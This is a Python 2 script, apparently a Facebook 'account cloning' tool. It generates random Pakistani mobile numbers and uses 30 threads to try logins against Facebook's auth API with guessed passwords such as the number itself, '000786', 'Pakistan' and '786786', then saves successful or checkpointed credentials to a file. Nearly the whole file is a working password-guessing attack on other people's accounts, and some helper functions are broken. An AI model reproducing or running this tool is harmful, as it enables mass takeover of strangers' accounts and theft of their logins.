#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: BMS.py')
 
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = (['Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]', '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]', 'Mozilla/5.0 (Linux; Android 9; i97) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]', 'Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]'])
 
def keluar():
	print 'Thanks.'
	os.sys.exit()
 
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
 
 
def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
 
 
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mALIF-KHAN–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
 
back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
 
os.system("clear")
print("""
\33[93m       /$$$$$$  /$$       /$$$$$$ /$$$$$$$$
\33[93m      /$$__  $$| $$      |_  $$_/| $$_____/
\33[93m     | $$  \ $$| $$        | $$  | $$      
\33[93m     | $$$$$$$$| $$        | $$  | $$$$$   
\33[93m     | $$__  $$| $$        | $$  | $$__/   
\33[93m     | $$  | $$| $$        | $$  | $$      
\33[93m     | $$  | $$| $$$$$$$$ /$$$$$$| $$      
\33[93m     |__/  |__/|________/|______/|__/                                      
\033[0;91m  ╔═══════════════════════════════════════════╗
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Author   \033[0;91m: \033[95mMAHDI HASAN (SHUVO)
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Github   \033[0;91m: \033[95mgithub.com/Shuvo-BBHH
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Facebook \033[0;91m: \033[95mfacebook.com/mahdihasan.80
\033[0;91m  ╚═══════════════════════════════════════════╝
""")
 
logo1 =("""
\33[93m       /$$$$$$  /$$       /$$$$$$ /$$$$$$$$
\33[93m      /$$__  $$| $$      |_  $$_/| $$_____/
\33[93m     | $$  \ $$| $$        | $$  | $$      
\33[93m     | $$$$$$$$| $$        | $$  | $$$$$   
\33[93m     | $$__  $$| $$        | $$  | $$__/   
\33[93m     | $$  | $$| $$        | $$  | $$      
\33[93m     | $$  | $$| $$$$$$$$ /$$$$$$| $$      
\33[93m     |__/  |__/|________/|______/|__/                                      
\033[0;91m  ╔═══════════════════════════════════════════╗
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Author   \033[0;91m: \033[95mMAHDI HASAN (SHUVO)
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Github   \033[0;91m: \033[95mgithub.com/Shuvo-BBHH
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Facebook \033[0;91m: \033[95mfacebook.com/mahdihasan.80
\033[0;91m  ╚═══════════════════════════════════════════╝
""")
logo2 =("""
\33[93m       /$$$$$$  /$$       /$$$$$$ /$$$$$$$$
\33[93m      /$$__  $$| $$      |_  $$_/| $$_____/
\33[93m     | $$  \ $$| $$        | $$  | $$      
\33[93m     | $$$$$$$$| $$        | $$  | $$$$$   
\33[93m     | $$__  $$| $$        | $$  | $$__/   
\33[93m     | $$  | $$| $$        | $$  | $$      
\33[93m     | $$  | $$| $$$$$$$$ /$$$$$$| $$      
\33[93m     |__/  |__/|________/|______/|__/                                      
\033[0;91m  ╔═══════════════════════════════════════════╗
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Author   \033[0;91m: \033[95mMAHDI HASAN SHUVO
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Github   \033[0;91m: \033[95mgithub.com/Alifvau
\033[0;91m   {\033[0;97m•\033[0;91m} \033[94m [•] Facebook \033[0;91m: \033[95mfacebook.com/ALIFVAUX
\033[0;91m  ╚═══════════════════════════════════════════╝
""")
Username = "ALIF-VAU"
Password= "ALIF-VAU"
 
loop = 'true'
while (loop == 'true'):
    password = raw_input("\033[1;92m \x1b[1;91m\n[✘]  Enter Password :- \x1b[1;95m")
    if (password == Password):
            print """
            \033[1;92mWelcome to Cloning
                  """
            loop = 'false'
    else:
            print "\033[1;91\n\n                  WRONG PASSWORD"
            os.system('xdg-open https://www.facebook.com/ALIFVAUX')
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
 
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;96m [1]\x1b[1;93mStart cloning "
    time.sleep(0.05)
    print '\x1b[1;95m [0]\033[1;92mExit '
    pilih_login()
 
def pilih_login():
    peak = raw_input("\n\033[1;93m \n [✘] CHOOSE: \033[1;91m")
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1]  Start Cracking ➤'
    time.sleep(0.05)
    print '\x1b[1;92m[0] \033[1;93m Back ➤'
    time.sleep(0.05)
    action()
 
def action():
    peak = raw_input('\n\033[1;95m  [✘] CHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "[✘] Enter Any Pakistani Mobile Code Number"
        print'[✘] Enter any code 1 to 49'
        try:
            c = raw_input("\033[1;96m[✔] Choose Country Code :-  ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;95m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;93m Code you choose: '+c)
    jalan ("\033[1;96m To Stop Process Press Ctrl+z")
    print 50* '\033[1;95m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\33[91m[MAHDI-OK]  '+ k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\33[92m[MAHDI-CP]  ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\33[91m[MAHDI-OK]  '+ k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\33[92m[MAHDI-CP]  '+ k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="000786"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\33[91m[MAHDI-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\33[92m[MAHDI-CP]  ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="Pakistan"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\33[91m[MAHDI-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\33[92m[MAHDI-CP]  ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\33[91m[ALIF-OK]  '+ k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\33[93m[MAHDI-CP]  '+ k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
 
 
                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            
 
 
 
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;92m-'
    print 'Process Has Been Complete'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('ALIF-VAU Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your (CP)Accounts Open after 7 or 10 days")
    print ''
    
    
    raw_input("\n\033[1;95m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login() 
